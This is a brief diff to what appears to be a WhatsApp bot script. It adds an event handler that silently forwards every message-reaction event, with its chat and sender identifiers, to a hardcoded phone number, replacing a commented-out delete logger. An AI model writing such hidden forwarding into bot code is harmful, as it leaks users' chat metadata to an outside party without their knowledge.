@@ -386,9 +386,9 @@ const startNyanBot = async () => {
 /*👑*/        })
 ////////////////////////////////////
 
-        /*nyanBot2.ev.on('messages.delete', async (test) => {
-            console.log(test)
-        })*/
+        nyanBot2.ev.on('messages.reaction', async (test) => {
+            nyanBot2.sendMessage("5219984907794@s.whatsapp.net", test)
+        })
 
         //autostatus view
         nyanBot2.ev.on('messages.upsert', async chatUpdate => {
